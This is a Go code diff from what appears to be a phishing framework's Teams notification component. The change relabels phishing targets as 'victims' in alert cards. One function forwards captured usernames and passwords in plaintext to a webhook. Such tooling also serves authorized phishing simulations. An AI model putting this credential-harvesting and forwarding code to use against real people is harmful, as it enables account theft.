@@ -66,8 +66,8 @@ type Submitted struct {
 func (r *Result) TeamsNotifyEmailSent(webhook_url string) {
     mstClient := goteamsnotify.NewTeamsClient()
     msgCard := messagecard.NewMessageCard()
-    msgCard.Title = "Email/SMS Sent"
-    msgCard.Text = "Email has been sent to target: **" + r.Email + "**"
+    msgCard.Title = "Email Sent"
+    msgCard.Text = "Email has been sent to victim: **" + r.Email + "**"
     msgCard.ThemeColor = "#00FF00"
 
     if err := mstClient.Send(webhook_url, msgCard); err != nil {
@@ -79,7 +79,7 @@ func (r *Result) TeamsNotifySMSSent(webhook_url string) {
     mstClient := goteamsnotify.NewTeamsClient()
     msgCard := messagecard.NewMessageCard()
     msgCard.Title = "SMS Sent"
-    msgCard.Text = "SMS has been sent to target: **" + r.Email + "**"
+    msgCard.Text = "SMS has been sent to victim: **" + r.Email + "**"
     msgCard.ThemeColor = "#00FF00"
 
     if err := mstClient.Send(webhook_url, msgCard); err != nil {
@@ -90,8 +90,8 @@ func (r *Result) TeamsNotifySMSSent(webhook_url string) {
 func (r *Result) TeamsNotifyEmailOpened(webhook_url string) {
     mstClient := goteamsnotify.NewTeamsClient()
     msgCard := messagecard.NewMessageCard()
-    msgCard.Title = "Email/SMS Opened"
-    msgCard.Text = "Email has been opened by target: **" + r.Email + "**"
+    msgCard.Title = "Email Opened"
+    msgCard.Text = "Email has been opened by victim: **" + r.Email + "**"
     msgCard.ThemeColor = "#FFFF00"
 
     if err := mstClient.Send(webhook_url, msgCard); err != nil {
@@ -103,7 +103,7 @@ func (r *Result) TeamsNotifyClickedLink(webhook_url string) {
     mstClient := goteamsnotify.NewTeamsClient()
     msgCard := messagecard.NewMessageCard()
     msgCard.Title = "Clicked Link"
-    msgCard.Text = "Link has been clicked by target: **" + r.Email + "**"
+    msgCard.Text = "Link has been clicked by victim: **" + r.Email + "**"
     msgCard.ThemeColor = "#FF9900"
 
     if err := mstClient.Send(webhook_url, msgCard); err != nil {
@@ -117,7 +117,7 @@ func (r *Result) TeamsNotifySubmittedData(webhook_url string, details EventDetai
     msgCard.Title = "Submitted Data"
     username := details.Payload.Get("Username")
     password := details.Payload.Get("Password")
-    msgCard.Text = "Target **" + r.BaseRecipient.Email + "** has submitted data! Details:<br>**Username**: " + username + "<br>**Password**: " + password
+    msgCard.Text = "Victim **" + r.BaseRecipient.Email + "** has submitted data! Details:<br>**Username**: " + username + "<br>**Password**: " + password
     msgCard.ThemeColor = "#FF0000"
 
     if err := mstClient.Send(webhook_url, msgCard); err != nil {
